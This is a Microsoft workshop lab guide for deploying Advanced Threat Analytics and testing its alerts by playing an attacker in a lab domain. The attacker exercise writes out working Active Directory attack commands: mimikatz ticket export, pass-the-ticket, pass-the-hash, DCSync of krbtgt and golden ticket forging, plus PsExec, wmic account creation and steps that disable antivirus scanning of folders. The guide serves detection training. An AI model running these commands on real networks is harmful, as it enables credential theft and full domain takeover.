# Lab High Level Steps:  Microsoft Security Workshop: Improving Detection
# Lab 2: Deploying and Using Microsoft Advanced Threat Analytics (ATA)

### Scenario
You manage an Active Directory environment with domain-joined Windows Server 2016 servers and Windows 10 Professional client computers. You plan to take advantage of the Microsoft Advanced Threat Analytics (ATA) functionality to enhance security of your environment by detecting potential threats.

  > **Note:** Microsoft ATA provides threat detection of a number of common exploits, including:
-   Reconnaissance
-   Remote execution
-   Malicious replications
-   Brute Force
-   Pass-the-Ticket (PtT)
-   Pass-the-Hash (PtH)
-   Overpass-the-Hash
-   Forged PAC (MS14-068)
-   Golden Ticket

  > **Note:** In this lab, you will explore some of these detection mechanisms. Note that some ATA alerts are generated following an initial “learning” period in order to minimize the number of false positives. For example, ATA learns the use of the “Net user and Net group” commands over a period of four weeks following its installation. During this period, you would not see alerts for “Reconnaissance using directory services queries”. These types of alerts will be clearly identified in the lab.

  > **Note:** In the first exercise of this lab, you will install Microsoft ATA in the lab environment. 
In the second exercise of this lab, you will assume the role of an attacker, which leverages stolen credentials of a domain user with the local Administrator privileges on a Windows 10 computer in order to perform reconnaissance of the Active Directory environment and, ultimately, establish domain dominance by employing a number of common post-breach exploits. Throughout individual steps of this process, you will examine alerts generated by Microsoft ATA.

### Lab setup
  
Estimated Time: 120 minutes

The lab consists of the following computers:
-   LON-DC1 – a Windows Server 2016 domain controller in the adatum.com single-domain forest. The domain controller will host the ATA Lightweight Gateway
-   LON-SVR1 – a Windows Server 2016 domain member server. This server will host the ATA Center.
-   LON-CL1 – a Windows 10 Pro version 1703 (or newer) domain member computer Windows 10. You will use this computer to test sample cyberattack and threat detection scenarios.
All computers have Internet connectivity


## Exercise 1: Deploying Microsoft ATA

The main task for this exercise are:

1.   Installing Microsoft ATA on a Windows Server 2016 domain member server (LON-SVR1)
2.   Connecting ATA to Active Directory
3.   Installing the ATA Lightweight Gateway on a Windows Server 2016 domain controller (LON-DC1)

#### Task 1: Installing Microsoft ATA on a Windows Server 2016 domain member server (LON-SVR1)

You will start by downloading and installing Microsoft ATA setup files on LON-SVR1. This server will serve the role of the ATA Center.

1.   Sign in to the LON-SVR1 lab virtual machine with the following credentials:

  -   USERNAME: **ADATUM\\Administrator**
  -   PASSWORD: **Pa55w.rd**

2.   From LON-SVR1, start Internet Explorer and browse to the Microsoft Advanced Threat Analytics page of the Microsoft Evaluation Center site at https://www.microsoft.com/en-us/evalcenter/evaluate-microsoft-advanced-threat-analytics
3.   On the Microsoft Advanced Threat Analytics page, provide your contact information and click **Continue**.
4.   From the **Start your evaluation** section, download the **ATA1.9.iso** file to the **Downloads** folder. The download should take about a minute.
5.   Mount the ISO file as the **E:** drive. 
6.   From the **E:** drive, start the **Microsoft ATA Center Setup** wizard.
7.   On the initial page of the wizard, select **English** in the drop-down list.
8.   Accept the Microsoft Software License Terms.
9.   Disable the Microsoft Update option. 
10.   On the **Configure the Center** page, accept the defaults and start the installation.

  > **Note:**  The setup process will install the following components:
  -   ATA Center service
  -   Mongo DB
  -   Custom Performance Monitor data collection set
  -   self-signed certificates 

  > **Note:**  You will use a self-signed certificate to secure communication to the ATA Console and ATA Center service. In a production environment, you would use a certificate issued by a trusted Certification Authority.

11.   Wait for the installation to complete. This should about 2 minutes. Once the installation completes successfully, start Internet Explorer and connect to the ATA Center console.

12.   On the newly opened Internet Explorer page, note the message referring to the certificate of the website, and click **Continue to this website (not recommended)**. This will display the **Welcome to Microsoft Advanced Threat Analytics** page.

  > **Note:**  The reason for the message is the mismatch between the URL (which uses localhost) and the subject name of the certificate (ATACenter). To remediate this, you will create a CNAME DNS record that points ATACenter.adatum.com to LON-SVR1.adatum.com and then replace localhost with ATACenter in the target URL.

13.   Connect to LON-DC1 and sign in with the following credentials: 

  -   USERNAME: **ADATUM\\Administrator**
  -   PASSWORD: **Pa55w.rd**

14.   On LON-DC1, start DNS Manager console. 
15.   In the DNS Manager console, navigate to the **Adatum.com** forward lookup zone.
16.   Create a new **CNAME** record with the following settings:

  -   Alias name (uses parent domain if left blank): **ATACenter**
  -   Fully qualified domain name (FQDN): ATACenter.adatum.com
  -   Fully qualified domain name (FQDN) for target host: LON-SVR1.adatum.com
  -   Allow any authenticated user to update all DNS records with the same name. This setting applies only to DNS records for a new name: leave the checkbox cleared


#### Task 2: Connecting ATA to Active Directory

The ATA Center must be able to connect with an Active Directory forest that you intend to monitor. In order to establish this connectivity, you will first create a non-privileged Active Directory user account and then use it to set up the connection in the ATA console.

1.   From the console session on LON-DC1, while you are signed as **ADATUM\\Administrator**, start **Active Directory Administrative Center**.
2.   In Active Directory Administrative Center, create a new user with the following settings:
  -   Full name: **ATAUser**
  -   User UPN Logon: **atauser@Adatum.com**
  -   User SamAccountName logon: **Adatum\\ATAUser**
  -   Password: **Pa55w.rd**
  -   Confirm password: **Pa55w.rd**
  -   Password options: **Password never expires** and **User cannot change password**
  -   Create in: **OU=IT,DC=Adatum,DC=com**
3.   Switch to the console session on LON-SVR1. On the **Welcome to Microsoft Advanced Threat Analytics** page, in the **Directory Services** pane, configure and test the connection with the following settings:
  -   Username: **ATAUser**
  -   Password: **Pa55w.rd**
  -   Domain: **adatum.com**
  -   Single level domain: make sure that this checkbox is cleared

#### Task 3: Installing the ATA Lightweight Gateway on a Windows Server 2016 domain controller (LON-DC1)

The next step of the ATA setup involves deployment of ATA Gateway. Due to the limitations of the lab environment, you will use the ATA Lightweight Gateway and deploy the gateway binaries directly to LON-DC1. In a production environment, you should consider deploying ATA Gateway to a dedicated server

1.   From the **Welcome to Microsoft Advanced Threat Analytics** page of the **ATA Center** console on LON-SVR1, download the ATA Gateway setup files.
2.   Copy the setup files to the **C:\UTIL** folder on LON-DC1.
3.   Switch to the console session on LON-DC1, extract the content of **Microsoft ATA Gateway Setup.zip** to **C:\UTIL**.
4.   Launch **ATA Gateway setup** wizard by using **Microsoft ATA Gateway Setup.exe**.
5.   On the **Welcome** page, accept the default language and click **Next**.
6.   On the **Gateway deployment type** page, note the message indicating the gateway type. The message might also indicate that the domain controller does not meet the minimum hardware requirements for the Lightweight Gateway. You can ignore it in the lab environment.

  > **Note:** The setup wizard automatically detect if the local server is a domain controller. If that is the case, the setup will result in the installation of ATA Lightweight Gateway, otherwise ATA Gateway will be installed.

  > **Note:** It is acceptable to ignore the warning about the minimum hardware requirements in the lab environment. For sizing your production deployments, refer to https://docs.microsoft.com/en-us/advanced-threat-analytics/ata-prerequisites#ata-lightweight-gateway-requirements 

7.   On the **Configure the Gateway** page, accept the default installation path.
8.   Wait until installation completes. This should take less than a minute.
9.   Switch to the console session on LON-SVR1. On the **Gateways** page, verify that the **LON-DC1** entry appears with the value **Lightweight Gateway** in the **TYPE** column and the **Running** **SERVICE STATUS**. 

  > **Note:**  You might need to wait a few minutes before the **SERVICE STATUS** change from **Starting** to **Running**.

10.   Review the **ATA Lightweight Gateway** settings. Note that it is configured by default to captures traffic on the local Ethernet network adapter. It is also not configured as the domain synchronizer candidate.
11.   Enable the **Domain synchronizer candidate** setting.

  > **Note:**  The domain synchronizer gateway is responsible for synchronizing all entities from a specific Active Directory domain proactively (similar to the mechanism used by the domain controllers themselves for replication). One gateway is chosen randomly, from the list of candidates, to serve as the domain synchronizer.  If the synchronizer is offline for more than 30 minutes, another candidate is chosen instead. If there is no domain synchronizer available for a specific domain, ATA is able to proactively synchronize entities and their changes, however ATA will reactively retrieve new entities as they are detected in the monitored traffic. If there is no domain synchronizer available, and you search for an entity that did not have any traffic related to it, no search results are displayed. By default, all ATA Gateways are synchronizer candidates. Because all ATA Lightweight Gateways are more likely to be deployed in branch sites and on small domain controllers, they are not synchronizer candidates by default.

> **Result**: After completing this exercise, you will have deployed ATA Center and ATA Lightweight Gateway in the lab environment. 

## Exercise 2: Using Microsoft ATA for Threat Detection

The main task for this exercise are:
1.   Detecting DNS Reconnaissance 
2.   Detecting Remote Execution 
3.   Enumerating NetBIOS sessions to a remote computer
4.   Carrying out an Pass-the-Ticket exploit
5.   Carrying out an Pass-the-Hash exploit
6.   Establishing Domain Dominance by compromising KRBTGT credentials and generating Golden Ticket


#### Task 1: Detecting DNS Reconnaissance

In this task, you will attempt a DNS-based reconnaissance and validate its detection

1.   Switch to the console of LON-CL1 and sign in to the LON-CL1 Windows 10 Professional lab virtual machine with the following credentials:

  -   USERNAME: **ADATUM\\Administrator**
  -   PASSWORD: **Pa55w.rd**

2.   Start Windows PowerShell as Administrator.
3.   From the **Administrator: Windows PowerShell** prompt, run the following:

```
Add-LocalGroupMember –Group Administrators –Member ADATUM\Ida
```

  > **Note:**  This command adds the **ADATUM\\Ida** user account to the local Administrators group on LON-CL1. It is fairly common that users have local Administrator privileges to their own client computers. In this exercise, you will assume that this is the compromised account. It is also not uncommon for users with domain Administrator privileges to log on to client computers. You will exploit this behavior in order to compromise the domain Administrator user account later in this exercise.

4.   Remain logged-on as **ADATUM\\Administrator** but use the Switch account option and start another logon session with the following credentials:

  -   USERNAME: **ADATUM\\Ida**
  -   PASSWORD: **Pa55w.rd**

  > **Note:**  Make sure to remain logged on as **ADATUM\\Administrator**.

5.   Once you logged on as **ADATUM\\Ida** to LON-CL1, start **Windows PowerShell** as Administrator.
6.   In the **Administrator: Windows PowerShell** window, run the following:

```
nslookup
ls –d adatum.com
exit
```

  > **Note:**  These commands attempt to perform transfer of all DNS records in the DNS zone adatum.com from LON-DC1. This will fail due to the configuration of the DNS server hosted on LON-DC1. However, you typically would want to know about failed attempts.

7.   From LON-CL1, start Internet Explorer and browse to https://ATACenter
8.   In the Internet Explorer window, on the **This site is not secure** page, click **More information** and then click **Go on to the webpage (not recommended)**.

  > **Note:**  In order to eliminate the message regarding untrusted certificate, you will add the certificate to the Trusted Root Certification Authorities. You will also need to switch the user to **ADATUM\\Administrator** to view the ATA Center console.

9.   In the Internet Explorer window, click **Certificate error** in the address bar and then click **View certificates**.
10.   In the **Certificate** dialog box, click **Install Certificate**. This will start **Certificate Import Wizard**.
11.   Use the wizard to install the certificate in the **Trusted root Certification Authorities** **Local Machine** store.
12.   Close Internet Explorer, re-open it, and browse again to https://ATACenter
13.   Note the message **IDA does not have permissions to access this page** and click **Switch user**. 
14.   In the **Windows Security** dialog box, type the following and click **OK**:

  -   USERNAME: **ADATUM\\Administrator**
  -   PASSWORD: **Pa55w.rd**

15.   You will be automatically redirected to the **Health** page of the **ATA Center** console. You should see a single alert labeled **Reconnaissance using DNS** representing your attempt to perform a DNS zone transfer to LON-CL1 (which is not a DNS server) from LON-DC1.

  > **Note:**  You might need to wait a few minutes before this entry appears on the Health page

16.   Click the **Reconnaissance using DNS** label. This will display details of the event. Examine the displayed information. Click to the right of the **OPEN** label and note that you have the options to close the alert, suppress the alert, close alert and exclude LON-CL1 from future alerts, download details of the alert, share it via email, and delete the alert. 

17.   Click the back arrow icon in the upper left corner of Internet Explorer to return to the listing of the alerts.

#### Task 2: Detecting Remote Execution

In this task, you will attempt Remote Execution and validate its detection. 

1.   On LON-CL1, switch to the logon session of **ADATUM\\Administrator**.
2.   Start Internet Explorer and browse to the PsTools download page at https://docs.microsoft.com/en-us/sysinternals/downloads/pstools and download **PsTools.zip** to the **Downloads** folder.
3.   Extract **PsExec.exe** and **Eula.txt** from **PSTools.zip** into the **C:\UTIL** folder.
4.   Start **Windows PowerShell** as Administrator.
5.   From the **Administrator: Windows PowerShell** window, run the following:

```
C:\UTIL\Psexec.exe –accepteula \\lon-dc1 cmd
```

  > **Note:** This command start a remote Command Prompt session on LON-DC1. 

6.   From the **Administrator: Windows PowerShell** window, run the following:

```
hostname
```

7.   Verify that the current hostname is LON-DC1. To close the remote session, from the **Administrator: Windows PowerShell** window, run the following:

```
exit
```

8.   Remain logged-on as **ADATUM\\Administrator** but use the **Switch account** option to switch to the existing logon session of **ADATUM\\Ida**.

  > **Note:** Make sure to remain logged on as **ADATUM\\Administrator**.

9.   In the Internet Explorer window displaying the **Health** page of the ATA Center console, you should see another alert labeled **Remote execution attempt detected** representing the remote session on LON-DC1 from LON-CL1.

  > **Note:**  You might need to wait a few minutes before this entry appears on the Health page

10.   Click the **Remote execution attempt detected** label. This will display details of the event. Examine the displayed information.
11.   Click the back arrow icon in the upper left corner of Internet Explorer to return to the listing of the alerts. 

#### Task 3: Enumerating NetBIOS sessions to a remote computer

Next, you will perform enumeration of NetBIOS sessions to a domain controller LON-DC1. This is another common reconnaissance technique that does not require elevated privileges on the remote computer, but it is detected by ATA.

1.   On LON-CL1, , remain logged-on as **ADATUM\\Ida** but use the **Switch user** option to switch to the existing logon session of **ADATUM\\Administrator**
2.   From the **Administrator: Windows PowerShell** window, run the following:

```
net use * \\lon-dc1\Sysvol
```

4.   Start a new instance of Internet Explorer, browse to http://www.joeware.net/freetools/tools/netsess/index.htm , and download the **NetSess.zip** file to the local **Downloads** folder.
5.   Extract **NetSess.exe** from the **NetSess.zip** file into the **C:\UTIL** folder.
6.   From the **Administrator: Windows PowerShell** window, run the following:

```
C:\UTIL\NetSess.exe lon-dc1.adatum.com
```

7.   Review the results and note that they include the NetBIOS session established by **ADATUM\\Administrator** from the same computer (LON-CL1 with the IP address of 172.16.0.102).
8.   Switch to the Internet Explorer window displaying the **Health** page of the ATA Center console. You should see another alert labeled **Reconnaissance using SMB Session Enumeration** representing execution of NetSess.exe.

  > **Note:** You might need to wait a few minutes before this entry appears on the Health page

9.   Click the **Reconnaissance using SMB Session Enumeration** label. This will display details of the event that resulted in the alert. Examine the displayed information, including the exposed accounts.
10.   Click the back arrow icon in the upper left corner of Internet Explorer to return to the listing of the alerts.

#### Task 4: Carrying out an Pass-the-Ticket exploit

Now you will leverage the information you gathered earlier in order to perform a Pass-the-Ticket exploit. First, you will confirm that **ADATUM\\Administrator** is actually a member of the Domain Admins group.

1.   On LON-CL1, remain logged-on as **ADATUM\\Ida** but use the **Switch account** option to switch to the existing logon session of **ADATUM\\Administrator**.
2.   From the **Administrator: Windows PowerShell** window, run the following:

```
dir \\lon-dc1.adatum.com\c$
```

  > **Note:** This command will generate a Kerberos ticket for **ADATUM\\Administrator**, which you will next steal as **ADATUM\\Ida**. 

3.   Remain logged-on as **ADATUM\\Administrator** but use the **Switch account** option to switch to the existing logon session of **ADATUM\\Ida**.
4.   From the **Administrator: Windows PowerShell** window, run the following:

```
net user administrator /domain
```

  > **Note:** The output of the command will include listing of the domain groups that the user is a member of, confirming its membership in Domain Admins. Alternatively, you could also run net user “Domain Admins” /domain and examine its output to identify all users that are members of the Domain Admins group.

5.   Start **Microsoft Edge**, browse to https://github.com/gentilkiwi/mimikatz/releases and try downloading the most recent version of **mimikatz_trunk.zip** to the **Downloads** folder.
6.   Note that Windows Defender Antivirus will automatically identify the file as containing a virus and delete it.
7.   On LON-CL1, start **Windows Defender Security Center**.
8.   In the **Windows Defender Security Center** window, click **Virus & threat protection**, then click **Virus & threat protection settings**, and then click **Exclusions**.
9.   Add the **Downloads* and **C:\UTIL** folders to the list of exclusions.
10.   Switch back to the Microsoft Edge window and, from the https://github.com/gentilkiwi/mimikatz/releases page, download the most recent version of **mimikatz_trunk.zip** to the **Downloads** folder.
11.   Extract the downloaded archive into the **C:\UTIL** folder.
12.   Start **Command Prompt** as Administrator.
13.   From the **Administrator: Command Prompt** window, run the following:

```
cd C:\UTIL\x64
```

14.   From the **Administrator: Command Prompt** window, run the following:

```
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

15.   This will dump each individual Kerberos ticket in the local cache into separate .kirbi files in the C:\\UTIL folder. You are interested only in those associated with the **ADATUM\\Administrator** account. In this task, you will test the **Pass-the-Ticket** functionality by validating access to the default administrative share of LON-DC1, so you’ll use only the relevant **CIFS** ticket. To copy the relevant tickets to the **C:\\UTIL\\Tickets** subfolder, from the **Administrator: Command Prompt** window, run the following: 

```
robocopy . C:\UTIL\Tickets *Administrator@cifs-lon-dc1.adatum.com.kirbi
```

16.   Now to execute a **Pass-the-Ticket** attack, from the **Administrator: Command Prompt** window, run the following:

```
mimikatz.exe "privilege::debug" "kerberos::ptt c:\UTIL\Tickets" "exit"
```

17.   To validate that the **Pass-the-Ticket** exploit was successful, from the **Administrator: Command Prompt** window, run the following:

```
klist
```

18.   Verify that the output includes the ticket of the **ADATUM\\Administrator** account. Another way to validate the outcome of the exploit is to enumerate content of the default administrative share on the domain controller LON-DC1. To accomplish this, from the **Administrator: Command Prompt** window, run the following:

```
dir \\lon-dc1.adatum.com\c$
```

19.   Ensure that the command returns the listing of the content of the C: drive on LON-DC1.

  > **Note:** ATA postpones generation of the Identity theft using pass-the-ticket attack alert so you will not be able to observe it in this lab. This delay is intended to lower the false positive rate of the Pass-the-Ticket alerts. 


#### Task 5: Carrying out an Pass-the-Hash exploit

Now you will leverage the information you gathered in the previous tasks in order to perform a Pass-the-Hash exploit.

1.   On LON-CL1, while signed on as **ADATUM\\Ida**, from the **Administrator: Command Prompt** window, run the following:

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > task5.txt
```

2.   From the **Administrator: Command Prompt** window, run the following:

```
notepad task5.txt
```

3.   Review the content of the file in Notepad and note the entries corresponding to the **ADATUM\\Administrator** account. While they do not include the clear text password (that entry should be null), they do contain the NTLM hash. Copy the value of the hash into Clipboard. 
4.   From the **Administrator: Command Prompt** window, run the following as a single command (make sure to replace the placeholder `<hash_value>` with the value of the NTLM hash you copied into Clipboard):

```
Mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /ntlm:<hash_value> /domain:adatum.com" "exit"
```

5.   This will open a new Command Prompt window. From the newly opened Command Prompt window, run the following:

```
whoami
```

6.   Note that you are still operating as the **ADATUM\\Ida**. Now, in the same Command Prompt window, run the following:

```
dir \\lon-dc1.adatum.com\c$
```

7.   Note that you are able to list the content of the default administrative share on the domain controller, which implies that you are operating as a member of the domain local Administrators group. Now that you have administrative privileges to the domain controller, you will create a new user account and add it to the domain local Administrators group. To accomplish this, in the same Command Prompt window, run the following:

```
wmic /node:"lon-dc1" process call create "net user /add user01 Pa55w.rd"
wmic /node:"lon-dc1" process call create "net localgroup Administrators user01 /add"
```

8.   To verify that the commands have been completed successfully, in the same Command Prompt window, run the following:

```
net localgroup administrators /domain
```

9.   Switch to the Internet Explorer window displaying the **Health** page of the ATA Center console. You should see another alert labeled **Remote execution attempt detected** representing the commands you ran from the Command Prompt in this task.
10.   Click the **Remote execution attempt detected** label. This will display details of the event. Examine the displayed information. 
11.   Click the back arrow icon in the upper left corner of Internet Explorer to return to the listing of the alerts.


#### Task 6: Establishing Domain Dominance by compromising KRBTGT credentials and generating Golden Ticket

Now you will establish domain dominance by compromising KRBTGT credentials. This allows you to issue Kerberos tickets which lifetime can span up to 10 years.

1.   On LON-CL1, while signed on as **ADATUM\\Ida**, from the same Command Prompt window that you invoked via mimikatz in the previous task, run the following:

```
C:\UTIL\x64\mimikatz.exe "lsadump::dcsync /domain:adatum.com /user:krbtgt" "exit" > C:\UTIL\x64\task6a.txt
```

2.   From the **Administrator: Command Prompt** window, run the following:

```
notepad C:\UTIL\x64\task6a.txt
```

3.   Review the content of the file in Notepad and note the entries corresponding to the **ADATUM\\krbtgt** account. While they do not include the clear text password, they do contain the NTLM hash. Copy the value of the hash into Clipboard. 
4.   Switch to the Internet Explorer window displaying the **Health** page of the ATA Center console. You should see another alert labeled **Malicious replication of directory services** representing the command you ran from the Command Prompt on LON-CL1.
5.   Click the **Malicious replication of directory services** label. This will display details of the event. Examine the displayed information. 
6.   To generate Golden Ticket, you need to identify the SID of the adatum.com domain. You can accomplish this by using the **whomi** command with the **//user** switch. In the same Command Prompt window which you invoked via mimikatz in the previous task, run the following:

```
whoami /user
```

7.   In the **SID** column, note the SID value excluding the last dash (-) and the trailing four digits. This represents the SID of the adatum.com domain. Copy this value into Clipboard.
8.   In the same Command Prompt window, run the following, while making sure to replace the `<hash_value>` placeholder with the value of the NTLM hash availble from Notepad and the `<domain_sid>` placeholder with the value of the domain SID you copied into Clipboard:

```
C:\UTIL\x64\mimikatz.exe "privilege::debug" "kerberos::golden /domain:adatum.com /sid:<domain_sid> /krbtgt:<hash_value> /user:Administrator /id:500
/groups:512,513,518,519,520 /ticket:admin.kirbi" "exit"

```

  > **Note:** For the list of well-known SIDs, refer to https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems 

9.   Verify that the ticket has been generated. The ticket includes group membership in Domain Admins (512), Domain Users (513), Schema Admins (518), Enterprise Admins (519) and Group Policy Creator Owners (520). Note that the lifetime of the ticket is 10 years.
10.   To test the usage of the Golden Ticket, start **Command Prompt** as Administrator.
11.   From the newly opened **Administrator: Command Prompt** window, run the following to verify that you (operating in the security context of **ADATUM\\Ida** account) currently do not have administrative access to the domain controller:

```
dir \\lon-dc1.adatum.com\c$
```

12.   Ensure that the command returns the Access is denied message.
13.   To load the Golden Ticket you generated, from the **Administrator: Command Prompt** window, run the following:

```
C:\UTIL\x64\mimikatz.exe "privilege::debug" "kerberos::ptt admin.kirbi" "exit"
```

14.   From the **Administrator: Command Prompt** window, run the following to verify that you (operating in the security context of **ADATUM\\Ida** account) now have administrative access to the domain controller:

```
dir \\lon-dc1.adatum.com\c$
```

15.   Ensure that the command returns the listing of the content of the C: drive on LON-DC1.

  > **Note:** ATA will generate a Kerberos Golden Ticket activity alert once the Golden Ticket is used again in more than 10 hours after its creation (since 10 hours is the lifetime of a regular Kerberos ticket).  

  > **Result**: After completing this exercise, you have used ATA for threat detection.

©2016 Microsoft Corporation. All rights reserved.

The text in this document is available under the [Creative Commons Attribution 3.0 License](https://creativecommons.org/licenses/by/3.0/legalcode "Creative Commons Attribution 3.0 License"), additional terms may apply.  All other content contained in this document (including, without limitation, trademarks, logos, images, etc.) are **not** included within the Creative Commons license grant.  This document does not provide you with any legal rights to any intellectual property in any Microsoft product. You may copy and use this document for your internal, reference purposes.

This document is provided "as-is." Information and views expressed in this document, including URL and other Internet Web site references, may change without notice. You bear the risk of using it. Some examples are for illustration only and are fictitious. No real association is intended or inferred. Microsoft makes no warranties, express or implied, with respect to the information provided here.